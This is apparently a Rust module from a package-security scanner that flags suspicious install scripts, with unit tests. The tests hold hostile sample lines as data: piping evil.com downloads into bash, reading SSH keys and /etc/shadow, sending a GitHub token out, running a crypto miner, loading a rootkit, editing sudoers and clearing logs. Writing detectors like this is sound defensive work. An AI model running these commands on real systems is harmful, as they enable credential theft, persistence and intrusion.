pub mod patterns;

use crate::features::Feature;
use crate::shared::models::PackageContext;
use crate::shared::scoring::{Signal, SignalCategory};

pub struct InstallScriptAnalysis;

impl Feature for InstallScriptAnalysis {
    fn analyze(&self, ctx: &PackageContext) -> Vec<Signal> {
        let Some(ref content) = ctx.install_script_content else {
            return Vec::new();
        };

        let compiled = patterns::compiled_patterns();
        let mut signals = Vec::new();

        for pat in compiled {
            if pat.regex.is_match(content) {
                let matched_line = content
                    .lines()
                    .find(|line| pat.regex.is_match(line))
                    .map(|line| line.trim().to_string());
                signals.push(Signal {
                    id: pat.id.clone(),
                    category: SignalCategory::Pkgbuild,
                    points: pat.points,
                    description: pat.description.clone(),
                    is_override_gate: pat.override_gate,
                    matched_line,
                });
            }
        }

        signals
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn analyze(content: &str) -> Vec<String> {
        let ctx = PackageContext {
            name: "test-pkg".into(),
            metadata: None,
            pkgbuild_content: None,
            install_script_content: Some(content.into()),
            prior_pkgbuild_content: None,
            git_log: vec![],
            maintainer_packages: vec![],
        };
        InstallScriptAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect()
    }

    fn has(ids: &[String], id: &str) -> bool {
        ids.iter().any(|s| s == id)
    }

    #[test]
    fn install_curl() {
        let ids = analyze("curl https://example.com/data");
        assert!(has(&ids, "P-INSTALL-CURL"));
    }

    #[test]
    fn install_wget() {
        let ids = analyze("wget https://example.com/data");
        assert!(has(&ids, "P-INSTALL-WGET"));
    }

    #[test]
    fn install_pipe_shell() {
        let ids = analyze("curl https://evil.com/setup | bash");
        assert!(has(&ids, "P-INSTALL-PIPE-SHELL"));
    }

    #[test]
    fn install_persistence() {
        let ids = analyze("systemctl enable evil.service");
        assert!(has(&ids, "P-INSTALL-PERSISTENCE"));
    }

    #[test]
    fn install_profile_mod() {
        let ids = analyze("echo 'export PATH=/evil:$PATH' >> ~/.bashrc");
        assert!(has(&ids, "P-INSTALL-PROFILE-MOD"));
    }

    #[test]
    fn install_ssh_access() {
        let ids = analyze("cat ~/.ssh/id_rsa");
        assert!(has(&ids, "P-INSTALL-SSH-ACCESS"));
    }

    #[test]
    fn install_browser_data() {
        let ids = analyze("tar czf /tmp/loot.tar.gz ~/.mozilla/");
        assert!(has(&ids, "P-INSTALL-BROWSER-DATA"));
    }

    #[test]
    fn install_gpg_access() {
        let ids = analyze("cp -r ~/.gnupg/ /tmp/keys");
        assert!(has(&ids, "P-INSTALL-GPG-ACCESS"));
    }

    #[test]
    fn install_passwd_read() {
        let ids = analyze("cat /etc/shadow > /tmp/hashes");
        assert!(has(&ids, "P-INSTALL-PASSWD-READ"));
    }

    #[test]
    fn install_base64() {
        let ids = analyze("echo payload | base64 -d > /tmp/evil");
        assert!(has(&ids, "P-INSTALL-BASE64"));
    }

    #[test]
    fn install_eval() {
        let ids = analyze("eval \"$cmd\"");
        assert!(has(&ids, "P-INSTALL-EVAL"));
    }

    #[test]
    fn install_nohup() {
        let ids = analyze("nohup /tmp/backdoor &");
        assert!(has(&ids, "P-INSTALL-NOHUP"));
    }

    #[test]
    fn install_tmp_exec() {
        let ids = analyze("chmod +x /tmp/payload");
        assert!(has(&ids, "P-INSTALL-TMP-EXEC"));
    }

    #[test]
    fn install_chmod_exec() {
        let ids = analyze("chmod +x setup && ./setup");
        assert!(has(&ids, "P-INSTALL-CHMOD-EXEC"));
    }

    #[test]
    fn install_python_exec() {
        let ids = analyze("exec(urlopen('https://evil.com/payload.py').read())");
        assert!(has(&ids, "P-INSTALL-PYTHON-EXEC"));
    }

    #[test]
    fn install_devnull_bg() {
        let ids = analyze("bash /tmp/miner.sh >/dev/null 2>&1 &");
        assert!(has(&ids, "P-INSTALL-DEVNULL-BG"));
    }

    #[test]
    fn install_miner() {
        let ids = analyze("./xmrig --donate-level 0");
        assert!(has(&ids, "P-INSTALL-MINER"));
    }

    #[test]
    fn install_kernel_mod() {
        let ids = analyze("insmod rootkit.ko");
        assert!(has(&ids, "P-INSTALL-KERNEL-MOD"));
    }

    #[test]
    fn install_env_tokens() {
        let ids = analyze("curl -H \"Authorization: $GITHUB_TOKEN\" https://evil.com");
        assert!(has(&ids, "P-INSTALL-ENV-TOKENS"));
    }

    // --- New obfuscation patterns ---

    #[test]
    fn install_ifs() {
        let ids = analyze("cat${IFS}/etc/passwd");
        assert!(has(&ids, "P-INSTALL-IFS"));
    }

    #[test]
    fn install_ansi_c_hex() {
        let ids = analyze("$'\\x63\\x61\\x74' /etc/shadow");
        assert!(has(&ids, "P-INSTALL-ANSI-C-HEX"));
    }

    #[test]
    fn install_rot13() {
        let ids = analyze("echo 'phey uggc://rivy.pbz' | tr 'a-zA-Z' 'n-za-mN-ZA-M' | bash");
        assert!(has(&ids, "P-INSTALL-ROT13"));
    }

    #[test]
    fn install_history_clear() {
        let ids = analyze("unset HISTFILE; history -c");
        assert!(has(&ids, "P-INSTALL-HISTORY-CLEAR"));
    }

    #[test]
    fn install_log_clear() {
        let ids = analyze("rm -rf /var/log/auth.log");
        assert!(has(&ids, "P-INSTALL-LOG-CLEAR"));
    }

    #[test]
    fn install_sudoers_mod() {
        let ids = analyze("echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers");
        assert!(has(&ids, "P-INSTALL-SUDOERS-MOD"));
    }

    #[test]
    fn install_prompt_command() {
        let ids = analyze("echo 'PROMPT_COMMAND=\"curl http://evil.com\"' >> ~/.bashrc");
        assert!(has(&ids, "P-INSTALL-PROMPT-COMMAND"));
    }

    #[test]
    fn install_xdg_autostart() {
        let ids = analyze("cp malware.desktop ~/.config/autostart/");
        assert!(has(&ids, "P-INSTALL-XDG-AUTOSTART"));
    }

    #[test]
    fn benign_install_no_signals() {
        let ids = analyze(r#"
post_install() {
    echo "Package installed successfully"
    echo "Run 'myapp --help' to get started"
}

post_upgrade() {
    echo "Package upgraded to $1"
}
"#);
        assert!(ids.is_empty(), "Benign install script should trigger no signals, got: {ids:?}");
    }
}
